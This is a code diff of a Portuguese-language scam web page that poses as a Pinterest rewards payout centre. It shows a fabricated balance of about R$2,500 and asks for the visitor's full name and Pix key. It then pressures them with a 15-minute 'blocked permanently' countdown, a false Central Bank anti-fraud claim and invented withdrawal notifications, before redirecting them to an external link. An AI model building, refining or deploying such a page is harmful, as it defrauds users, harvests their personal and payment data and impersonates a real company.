@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -10,129 +9,140 @@
             --p-red: #e60023;
             --p-dark: #bd081c;
             --green: #27ae60;
-            --bg: #f8f9fa;
+            --bg: #f4f4f4;
+            --white: #ffffff;
         }
 
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
 
         body {
             margin: 0; padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--bg);
             color: #1a1a1b;
             display: flex; justify-content: center;
-            overflow-x: hidden;
         }
 
         .mobile-shell {
             width: 100%; max-width: 480px; min-height: 100vh;
-            background: white; display: flex; flex-direction: column;
-            position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            background: var(--white); display: flex; flex-direction: column;
+            position: relative; box-shadow: 0 0 30px rgba(0,0,0,0.1);
         }
 
         .header {
-            padding: 16px; text-align: center; font-weight: 800;
-            border-bottom: 1px solid #f0f0f0; background: white;
+            padding: 16px; text-align: center; font-weight: 800; font-size: 1.1rem;
+            border-bottom: 1px solid #eee; background: white;
             position: sticky; top: 0; z-index: 100;
         }
 
         .content { padding: 20px; flex-grow: 1; }
 
+        /* Wallet Card Premium */
         .wallet {
-            background: linear-gradient(135deg, var(--p-red), var(--p-dark));
-            border-radius: 24px; padding: 28px; color: white;
+            background: linear-gradient(135deg, var(--p-red) 0%, var(--p-dark) 100%);
+            border-radius: 20px; padding: 25px; color: white;
             display: flex; justify-content: space-between; align-items: center;
-            box-shadow: 0 12px 25px rgba(230, 0, 35, 0.2);
+            box-shadow: 0 10px 20px rgba(230, 0, 35, 0.3);
             margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .wallet-label { font-size: 0.85rem; opacity: 0.9; margin-bottom: 5px; }
-        .wallet-balance { font-size: 2.2rem; font-weight: 800; letter-spacing: -1px; }
+        .wallet-label { font-size: 0.9rem; opacity: 0.9; margin-bottom: 5px; font-weight: 500; }
+        .wallet-balance { font-size: 2.4rem; font-weight: 900; letter-spacing: -1px; }
 
         .logo-box {
-            width: 55px; height: 55px; background: white; border-radius: 50%;
+            width: 50px; height: 50px; background: white; border-radius: 50%;
             display: flex; align-items: center; justify-content: center; padding: 10px;
         }
         .logo-box img { width: 100%; height: auto; }
 
+        /* Live Status Professional */
         .live-status {
-            background: #fff; border: 1px solid #eee; border-radius: 16px;
-            padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px;
+            background: #fdfdfd; border: 1px solid #eee; border-radius: 12px;
+            padding: 12px; display: flex; align-items: center; gap: 10px; margin-bottom: 20px;
         }
 
-        .dot { width: 10px; height: 10px; background: var(--green); border-radius: 50%; position: relative; }
+        .dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; position: relative; }
         .dot::after { content: ''; position: absolute; width: 100%; height: 100%; background: var(--green); border-radius: 50%; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(3); opacity: 0; } }
+        .live-text { font-size: 0.85rem; font-weight: 700; color: #444; }
 
-        .live-text { font-size: 0.85rem; font-weight: 600; color: #555; }
-
+        /* CTA Irresistível */
         .btn {
-            width: 100%; border: none; padding: 20px; border-radius: 18px;
+            width: 100%; border: none; padding: 22px; border-radius: 15px;
             font-size: 1.1rem; font-weight: 800; text-transform: uppercase;
-            cursor: pointer; transition: 0.3s; margin-bottom: 12px;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
+            cursor: pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
 
-        .btn-resgatar { background: var(--green); color: white; box-shadow: 0 8px 15px rgba(39, 174, 96, 0.2); }
-        .btn-sacar { background: var(--p-red); color: white; box-shadow: 0 8px 15px rgba(230, 0, 35, 0.2); display: none; }
+        .btn-resgatar { background: var(--green); color: white; }
+        .btn-resgatar:hover { transform: scale(1.02); filter: brightness(1.1); }
 
-        .activity { margin-top: 25px; }
-        .activity-title { font-size: 0.8rem; font-weight: 700; color: #999; text-transform: uppercase; margin-bottom: 10px; }
-        .item { background: #fdfdfd; padding: 15px; border-radius: 16px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #f0f0f0; margin-bottom: 8px; }
-        .item-n { font-weight: 600; font-size: 0.85rem; }
-        .item-v { color: var(--green); font-weight: 700; font-size: 0.85rem; }
+        .btn-sacar { background: var(--p-red); color: white; display: none; }
+        .btn-confirm { background: var(--p-red); color: white; margin-top: 10px; }
 
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
-        .popup { background: white; width: 90%; max-width: 400px; border-radius: 24px; padding: 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); animation: slideUp 0.4s ease-out; text-align: center; }
-        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .btn:active { transform: scale(0.98); }
 
-        .popup-h { font-weight: 800; font-size: 1.4rem; margin-bottom: 15px; color: var(--p-red); }
-        .popup-p { font-size: 1rem; color: #444; margin-bottom: 25px; line-height: 1.5; }
+        /* Activities */
+        .activity-title { font-size: 0.8rem; font-weight: 800; color: #999; text-transform: uppercase; margin: 25px 0 10px; letter-spacing: 1px; }
+        .item { background: #fafafa; padding: 14px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #f0f0f0; margin-bottom: 8px; }
+        .item-n { font-weight: 600; font-size: 0.85rem; color: #555; }
+        .item-v { color: var(--green); font-weight: 800; font-size: 0.9rem; }
 
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-label { display: block; font-size: 0.8rem; font-weight: 700; color: #444; margin-bottom: 5px; }
-        .popup-select, .popup-input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; font-size: 1rem; outline: none; background: #f9f9f9; }
+        /* Popups & Overlays */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px); padding: 20px; }
+        .popup { background: white; width: 100%; max-width: 400px; border-radius: 28px; padding: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); animation: slideUp 0.5s ease; text-align: center; }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 
-        .btn-confirm { background: var(--p-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 15px; font-weight: 800; font-size: 1.1rem; cursor: pointer; }
+        .popup-h { font-weight: 900; font-size: 1.6rem; margin-bottom: 12px; color: var(--p-red); line-height: 1.2; }
+        .popup-p { font-size: 1rem; color: #666; margin-bottom: 25px; line-height: 1.5; }
 
-        .timer-box { font-size: 24px; font-weight: 800; color: var(--p-red); margin: 15px 0; background: #fff0f0; padding: 10px; border-radius: 10px; display: inline-block; width: 120px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--p-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .input-group { margin-bottom: 16px; text-align: left; }
+        .input-label { display: block; font-size: 0.8rem; font-weight: 800; color: #333; margin-bottom: 6px; text-transform: uppercase; }
+        .popup-select, .popup-input { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #eee; font-size: 1rem; background: #f9f9f9; transition: 0.3s; }
+        .popup-input:focus { border-color: var(--p-red); background: white; }
+
+        .timer-box { font-size: 28px; font-weight: 900; color: var(--p-red); margin: 15px 0; background: #fff0f0; padding: 12px 25px; border-radius: 15px; display: inline-block; border: 2px solid var(--p-red); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--p-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #toastContainer { position: fixed; bottom: 20px; left: 20px; z-index: 999999; width: 90%; max-width: 300px; pointer-events: none; }
-        .toast { background: white; border-radius: 15px; padding: 12px 18px; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); border-left: 5px solid var(--p-red); margin-bottom: 10px; animation: toastSlideLeft 4s ease-in-out forwards; }
-        @keyframes toastSlideLeft { 0% { opacity: 0; transform: translateX(-50px); } 10% { opacity: 1; transform: translateX(0); } 90% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(-50px); } }
-        .toast-img { width: 32px; height: 32px; background: var(--p-red); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
-        .toast-content { font-size: 0.8rem; color: #333; line-height: 1.3; text-align: left; }
-        .toast-content b { color: var(--p-red); }
+        /* Notificações (Toasts) */
+        #toastContainer { position: fixed; bottom: 20px; left: 20px; z-index: 999999; width: calc(100% - 40px); max-width: 320px; pointer-events: none; }
+        .toast { background: white; border-radius: 16px; padding: 15px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); border-left: 6px solid var(--p-red); margin-bottom: 10px; animation: toastIn 0.5s ease, toastOut 0.5s ease 3.5s forwards; }
+        @keyframes toastIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @keyframes toastOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(-100%); opacity: 0; } }
+        .toast-img { width: 35px; height: 35px; background: var(--p-red); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; flex-shrink: 0; }
+        .toast-content { font-size: 0.85rem; color: #333; line-height: 1.3; }
+        .toast-content b { color: var(--p-red); font-weight: 800; }
 
-        .footer { text-align: center; font-size: 0.7rem; color: #999; padding: 20px 0; margin-top: 10px; }
+        .footer { text-align: center; font-size: 0.75rem; color: #bbb; padding: 25px 0; }
     </style>
 </head>
 <body>
 
 <div class="overlay" id="welcomeOverlay" style="display: flex;">
     <div class="popup">
-        <div class="logo-box" style="margin: 0 auto 15px; background: var(--p-red);">
+        <div class="logo-box" style="margin: 0 auto 15px; background: var(--p-red); width: 70px; height: 70px;">
             <img src="https://pngimg.com/uploads/pinterest/pinterest_PNG76.png" style="filter: brightness(0) invert(1);" alt="P">
         </div>
-        <div class="popup-h">Parabéns! 🎉</div>
+        <div class="popup-h">ACESSO LIBERADO! 💸</div>
         <p class="popup-p">
-            Agora você é um <b>usuário monetizado</b>!<br><br>
-            Você pode ganhar dinheiro apenas <b>curtindo e salvando pins</b> diariamente. Você já possui um saldo acumulado disponível!
+            Seu perfil foi selecionado e já acumulou <b>comissões</b> por salvamentos automáticos.<br><br>
+            Aperte no botão abaixo para <b>resgatar seu saldo</b> agora mesmo!
         </p>
-        <button class="btn-confirm" id="btnStart">RESGATAR MEU SALDO AGORA</button>
+        <button class="btn btn-confirm" id="btnStart">QUERO MEU SALDO AGORA</button>
     </div>
 </div>
 
 <div id="toastContainer"></div>
 
 <div class="mobile-shell">
-    <div class="header">Área de Recompensas</div>
+    <div class="header"> Centro de Pagamentos</div>
     <div class="content">
         <div class="wallet">
             <div>
-                <div class="wallet-label">Seu saldo acumulado</div>
+                <div class="wallet-label">Saldo Disponível</div>
                 <div id="balance" class="wallet-balance">R$ 0,00</div>
             </div>
             <div class="logo-box"><img src="https://pngimg.com/uploads/pinterest/pinterest_PNG76.png" alt="P"></div>
@@ -140,30 +150,30 @@
 
         <div class="live-status">
             <div class="dot"></div>
-            <div id="feed-msg" class="live-text">Aguardando resgate...</div>
+            <div id="feed-msg" class="live-text">CONTA PRONTA PARA SAQUE</div>
         </div>
 
-        <button id="btnResgatar" class="btn btn-resgatar">💰 RESGATAR RECOMPENSAS</button>
-        <button id="btnSacar" class="btn btn-sacar">💸 SACAR VIA PIX AGORA</button>
+        <button id="btnResgatar" class="btn btn-resgatar">💰 LIBERAR MEU SALDO</button>
+        <button id="btnSacar" class="btn btn-sacar">🚀 RECEBER VIA PIX AGORA</button>
 
         <div class="activity">
-            <div class="activity-title">Ganhos detalhados</div>
+            <div class="activity-title">Extrato de Ganhos</div>
             <div id="lista-ganhos"></div>
         </div>
 
-        <div class="footer">Copyright Pinterest, todos os direitos reservados.</div>
+        <div class="footer">Verificado pelo Pinterest Rewards Brasil © 2026</div>
     </div>
 </div>
 
 <div class="overlay" id="pixOverlay">
     <div class="popup">
         <div id="formPix">
-            <div class="popup-h">Saque via Pix</div>
-            <p class="popup-p">Informe seus dados para receber o valor.</p>
+            <div class="popup-h">Onde deseja receber?</div>
+            <p class="popup-p">O valor será enviado <b>imediatamente</b> após a confirmação.</p>
             
             <div class="input-group">
-                <span class="input-label">Nome Completo</span>
-                <input type="text" class="popup-input" id="userName" placeholder="Nome completo do titular...">
+                <span class="input-label">Seu Nome Completo</span>
+                <input type="text" class="popup-input" id="userName" placeholder="Nome do titular da conta">
             </div>
 
             <div class="input-group">
@@ -171,265 +181,125 @@
                 <select class="popup-select" id="pixType">
                     <option value="cpf">CPF</option>
                     <option value="email">E-mail</option>
-                    <option value="numero">Número (Telefone)</option>
+                    <option value="numero">Celular</option>
                 </select>
             </div>
             <div class="input-group">
-                <span class="input-label">Chave Pix</span>
-                <input type="text" class="popup-input" id="pixValue" placeholder="Digite sua Chave Pix aqui...">
+                <span class="input-label">Sua Chave Pix</span>
+                <input type="text" class="popup-input" id="pixValue" placeholder="Digite sua chave aqui">
             </div>
-            <button class="btn-confirm" id="btnConfirmarSaque">CONFIRMAR SAQUE</button>
+            <button class="btn btn-confirm" id="btnConfirmarSaque">SOLICITAR SAQUE AGORA</button>
         </div>
 
-        <div id="verificationStep" style="display:none; text-align: center;">
-            <div class="popup-h">Processando Saque</div>
+        <div id="verificationStep" style="display:none;">
+            <div class="popup-h">SISTEMA PROCESSANDO...</div>
             <div class="loader" id="processLoader"></div>
-            <p class="popup-p" id="verifMessage" style="font-weight: 700; color: #333;">Transferindo Agora!</p>
+            <p class="popup-p" id="verifMessage" style="font-weight: 800; color: var(--green);">Transferência Iniciada!</p>
             <div id="timerContainer" style="display:none;">
-                <p class="popup-p">Para concluir a transferência é necessário uma verificação para provar que você é um usuário real.</p>
+                <p class="popup-p" style="font-size: 0.95rem; color: #333;">O Banco Central exige uma <b>verificação anti-fraude</b> para liberar saques acima de R$ 2.000,00.</p>
                 <div class="timer-box" id="countdown">15:00</div>
-                <p class="popup-p" style="color: var(--p-red); font-weight: 700; font-size: 0.85rem;">Conclua em até 15 minutos ou seu saldo será Bloqueado 🚫</p>
-                <button class="btn-confirm" id="btnVerificar" style="background: var(--green);">PROVAR QUE SOU REAL</button>
+                <p class="popup-p" style="color: var(--p-red); font-weight: 800; margin-top: 10px;">ATENÇÃO: Conclua em 15 minutos ou seu saldo será <b>BLOQUEADO PERMANENTEMENTE</b> 🚫</p>
+                <button class="btn btn-confirm" id="btnVerificar" style="background: var(--green); padding: 25px; font-size: 1.3rem;">✅ VALIDAR CONTA E RECEBER</button>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    const MIN_TOTAL = 2500.00;
-    const MAX_TOTAL = 2950.00;
-    const STORAGE_KEY_VAL = 'pin_total_v7';
-    const STORAGE_KEY_LIST = 'pin_list_v7';
+    // Configurações de Saldo (Foco em R$ 2.500+)
+    const MIN_TOTAL = 2510.50;
+    const MAX_TOTAL = 2985.90;
+    const TARGET = (Math.random() * (MAX_TOTAL - MIN_TOTAL) + MIN_TOTAL);
 
-    function initData() {
-        let total = localStorage.getItem(STORAGE_KEY_VAL);
-        let listHtml = localStorage.getItem(STORAGE_KEY_LIST);
+    function initGanhos() {
+        const atividades = ["Salvamento de Pin Premium", "Avaliação de Engajamento", "Bônus de Usuário Ativo", "Verificação de Perfil", "Feedback de Tendências", "Criação de Pasta Estratégica", "Visualização de Ad Premiado", "Compartilhamento Social", "Referência de Novo Membro", "Pesquisa Interna Pinterest", "Recompensa de Login Diário", "Análise de Vídeo Curto", "Fidelidade Semanal", "Curadoria de Pins"];
+        let soma = 0;
+        let html = '';
+        const lista = document.getElementById('lista-ganhos');
         
-        if (!total) {
-            total = (Math.random() * (MAX_TOTAL - MIN_TOTAL) + MIN_TOTAL).toFixed(2);
-            localStorage.setItem(STORAGE_KEY_VAL, total);
-            const atividades = ["Você salvou um Pin", "Recompensa por Engajamento", "Recompensa usuário ativo", "Bônus de Perfil Verificado", "Comentário em publicação", "Pasta de ideias criada", "Visualização de Pin Premiado", "Compartilhamento de conteúdo", "Convite de amigo aceito", "Pesquisa de satisfação concluída", "Recompensa diária (Day 7)", "Engajamento em Pin de Vídeo", "Bônus de fidelidade trimestral", "Organização de Pins salvos"];
-            let soma = 0;
-            let html = '';
-            atividades.forEach(a => {
-                let v = (Math.random() * (total / 18) + 100).toFixed(2);
-                soma += parseFloat(v);
-                html += `<div class="item"><span class="item-n">${a}</span><span class="item-v">+ R$ ${parseFloat(v).toLocaleString('pt-BR', {minimumFractionDigits:2})}</span></div>`;
-            });
-            const resto = parseFloat(total) - soma;
-            html += `<div class="item"><span class="item-n">Bônus Especial Pinterest Rewards</span><span class="item-v">+ R$ ${resto.toLocaleString('pt-BR', {minimumFractionDigits:2})}</span></div>`;
-            localStorage.setItem(STORAGE_KEY_LIST, html);
-            listHtml = html;
-        }
-        document.getElementById('lista-ganhos').innerHTML = listHtml;
-        return parseFloat(total);
+        atividades.forEach(a => {
+            let v = (Math.random() * (TARGET / 18) + 100);
+            soma += v;
+            html += `<div class="item"><span class="item-n">${a}</span><span class="item-v">+ R$ ${v.toLocaleString('pt-BR', {minimumFractionDigits:2})}</span></div>`;
+        });
+        const resto = TARGET - soma;
+        html += `<div class="item"><span class="item-n">Bônus de Ativação Monetária</span><span class="item-v">+ R$ ${resto.toLocaleString('pt-BR', {minimumFractionDigits:2})}</span></div>`;
+        lista.innerHTML = html;
     }
 
-    const TARGET = initData();
     const balanceEl = document.getElementById('balance');
     const btnResgatar = document.getElementById('btnResgatar');
     const btnSacar = document.getElementById('btnSacar');
-    const pixInput = document.getElementById('pixValue');
-    const pixType = document.getElementById('pixType');
-    const nameInput = document.getElementById('userName');
     const pixOverlay = document.getElementById('pixOverlay');
 
     document.getElementById('btnStart').onclick = () => {
         document.getElementById('welcomeOverlay').style.display = 'none';
-        btnResgatar.click();
+        initGanhos();
+        setTimeout(() => btnResgatar.click(), 500);
     };
-
-    function validateCPF(cpf) {
-        cpf = cpf.replace(/[^\d]+/g, '');
-        if (cpf.length !== 11 || !!cpf.match(/(\d)\1{10}/)) return false;
-        let cpfs = cpf.split('');
-        const validator = (l) => {
-            let s = cpfs.slice(0, l).reduce((acc, curr, i) => acc + (curr * ((l + 1) - i)), 0);
-            let r = (s * 10) % 11;
-            return r === 10 || r === 11 ? 0 : r;
-        };
-        return validator(9) === parseInt(cpfs[9]) && validator(10) === parseInt(cpfs[10]);
-    }
 
     btnResgatar.onclick = function() {
-        btnResgatar.disabled = true;
-        btnResgatar.innerText = "PROCESSANDO...";
+        this.disabled = true;
+        this.innerText = "LIBERANDO VALORES...";
         let start = null;
-        function step(timestamp) {
+        function animate(timestamp) {
             if (!start) start = timestamp;
             let progress = timestamp - start;
-            let cur = Math.min((progress / 2500) * TARGET, TARGET);
-            balanceEl.innerText = `R$ ${cur.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
-            if (progress < 2500) window.requestAnimationFrame(step);
-            else { 
-                btnResgatar.style.display = "none"; 
-                btnSacar.style.display = "flex"; 
-                document.getElementById('feed-msg').innerHTML = "<b>Saldo liberado para saque!</b>"; 
+            let val = Math.min((progress / 2000) * TARGET, TARGET);
+            balanceEl.innerText = `R$ ${val.toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+            if (progress < 2000) requestAnimationFrame(animate);
+            else {
+                btnResgatar.style.display = "none";
+                btnSacar.style.display = "flex";
+                document.getElementById('feed-msg').innerHTML = "<span style='color:var(--green)'>✓ SALDO DISPONÍVEL PARA SAQUE</span>";
             }
         }
-        window.requestAnimationFrame(step);
+        requestAnimationFrame(animate);
     };
 
-    btnSacar.onclick = () => { pixOverlay.style.display = "flex"; };
+    btnSacar.onclick = () => pixOverlay.style.display = "flex";
 
     document.getElementById('btnConfirmarSaque').onclick = function() {
-        const val = pixInput.value.trim();
-        const name = nameInput.value.trim();
-
-        if(name === "") return alert("Por favor, informe seu Nome Completo.");
-        if(val === "") return alert("Preencha a chave Pix.");
-        if(pixType.value === 'cpf' && !validateCPF(val)) return alert("CPF inválido.");
-        
+        if(!document.getElementById('userName').value || !document.getElementById('pixValue').value) return alert("Preencha todos os campos corretamente.");
         document.getElementById('formPix').style.display = "none";
         document.getElementById('verificationStep').style.display = "block";
         setTimeout(() => {
             document.getElementById('processLoader').style.display = "none";
-            document.getElementById('verifMessage').innerHTML = "Saque Agendado!";
             document.getElementById('timerContainer').style.display = "block";
-            let t = 15 * 60;
-            const iv = setInterval(() => {
-                let m = parseInt(t / 60, 10), s = parseInt(t % 60, 10);
-                document.getElementById('countdown').textContent = (m<10?"0"+m:m)+":"+(s<10?"0"+s:s);
-                if (--t < 0) { clearInterval(iv); document.getElementById('countdown').textContent = "BLOQUEADO"; }
-            }, 1000);
+            startTimer();
         }, 3000);
     };
 
-    document.getElementById('btnVerificar').onclick = () => { window.location.href = "https://compraonlinesegurada.org.ua/c/ff74979f50"; };
-
-    // TOASTS / PROVA SOCIAL
-    const nomesToast = ["Ricardo S.", "Amanda O.", "Bruno C.", "Juliana L.", "Felipe A.", "Beatriz M.", "Thiago H.", "Larissa F."];
-    let isF = true;
-    function createToast() {
-        const container = document.getElementById('toastContainer');
-        if (!container) return;
-
-        let n = isF ? "Gabriela Silva" : nomesToast[Math.floor(Math.random() * nomesToast.length)];
-        let v = isF ? "2397,78" : (Math.random() * (2900 - 2500) + 2500).toLocaleString('pt-BR', {minimumFractionDigits: 2});
-        isF = false;
-        
-        const t = document.createElement('div');
-        t.className = 'toast';
-        t.innerHTML = `<div class="toast-img">✓</div><div class="toast-content"><b>${n}</b> sacou<br><b>R$ ${v}</b> via Pix.</div>`;
-        container.appendChild(t);
-        setTimeout(() => t.remove(), 4000);
+    function startTimer() {
+        let t = 900;
+        const disp = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            let m = Math.floor(t / 60);
+            let s = t % 60;
+            disp.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            if(t <= 0) { clearInterval(interval); disp.innerText = "BLOQUEADO"; }
+            t--;
+        }, 1000);
     }
 
-    window.onload = () => {
-        setTimeout(createToast, 4000);
-        setInterval(() => { if (Math.random() > 0.3) createToast(); }, 8500);
-    };
+    document.getElementById('btnVerificar').onclick = () => window.location.href = "https://compraonlinesegurada.org.ua/c/ff74979f50";
+
+    // Prova Social Otimizada
+    const nomes = ["Ana Santos", "Carlos Lima", "Bruno F.", "Jessica M.", "Felipe Souza", "Marcos V.", "Luciana R.", "Thiago H."];
+    let isFirst = true;
+    function showToast() {
+        const n = isFirst ? "Gabriela Silva" : nomes[Math.floor(Math.random() * nomes.length)];
+        const v = isFirst ? "2.397,78" : (Math.random() * (2900 - 2200) + 2200).toLocaleString('pt-BR', {minimumFractionDigits:2});
+        isFirst = false;
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerHTML = `<div class="toast-img">✓</div><div class="toast-content"><b>${n}</b> acabou de sacar<br><b>R$ ${v}</b> via Pix.</div>`;
+        document.getElementById('toastContainer').appendChild(toast);
+        setTimeout(() => toast.remove(), 4000);
+    }
+
+    setTimeout(showToast, 3000);
+    setInterval(() => { if(Math.random() > 0.4) showToast(); }, 7000);
 </script>
 </body>
 </html>
-<div id="toastContainer" style="
-    position: fixed; 
-    bottom: 20px; /* Posicionado no fundo */
-    left: 20px;   /* Posicionado à esquerda */
-    z-index: 999999; 
-    width: 90%; 
-    max-width: 320px; 
-    pointer-events: none;
-"></div>
-
-<style>
-    .toast-card {
-        background: white;
-        border-radius: 15px; /* Bordas levemente arredondadas para o canto */
-        padding: 12px 18px;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-        border-left: 5px solid #e60023; 
-        margin-bottom: 10px;
-        animation: toastSlideInLeft 4s ease-in-out forwards;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    }
-
-    /* Animação vindo da esquerda para a direita */
-    @keyframes toastSlideInLeft {
-        0% { opacity: 0; transform: translateX(-50px); }
-        10% { opacity: 1; transform: translateX(0); }
-        90% { opacity: 1; transform: translateX(0); }
-        100% { opacity: 0; transform: translateX(-50px); }
-    }
-
-    .toast-icon {
-        width: 32px;
-        height: 32px;
-        background: #e60023;
-        color: white;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 1rem;
-        flex-shrink: 0;
-    }
-
-    .toast-text {
-        font-size: 0.8rem;
-        color: #333;
-        line-height: 1.3;
-        text-align: left;
-    }
-
-    .toast-text b {
-        color: #e60023;
-    }
-</style>
-
-<script>
-    (function() {
-        const nomes = ["Ricardo S.", "Amanda O.", "Bruno C.", "Juliana L.", "Felipe A.", "Beatriz M.", "Thiago H.", "Larissa F.", "Marcos V.", "Patrícia R.", "Rodrigo T.", "Camila B."];
-        let isFirst = true;
-
-        function showToast() {
-            const container = document.getElementById('toastContainer');
-            if (!container) return;
-
-            let nome, valor;
-
-            if (isFirst) {
-                nome = "Gabriela Silva";
-                valor = "2.397,78";
-                isFirst = false;
-            } else {
-                nome = nomes[Math.floor(Math.random() * nomes.length)];
-                // Valores entre 2253 e 2943
-                valor = (Math.random() * (2943 - 2253) + 2253).toLocaleString('pt-BR', {
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2
-                });
-            }
-
-            const toast = document.createElement('div');
-            toast.className = 'toast-card';
-            toast.innerHTML = `
-                <div class="toast-icon">✓</div>
-                <div class="toast-text">
-                    <b>${nome}</b> acabou de sacar<br>
-                    <b>R$ ${valor}</b> via Pix.
-                </div>
-            `;
-
-            container.appendChild(toast);
-
-            setTimeout(() => {
-                if (toast.parentNode) toast.remove();
-            }, 4000);
-        }
-
-        // Inicia após 3 segundos
-        setTimeout(showToast, 3000);
-
-        // Loop aleatório
-        setInterval(() => {
-            if (Math.random() > 0.3) {
-                showToast();
-            }
-        }, 8000);
-    })();
-</script>
-	
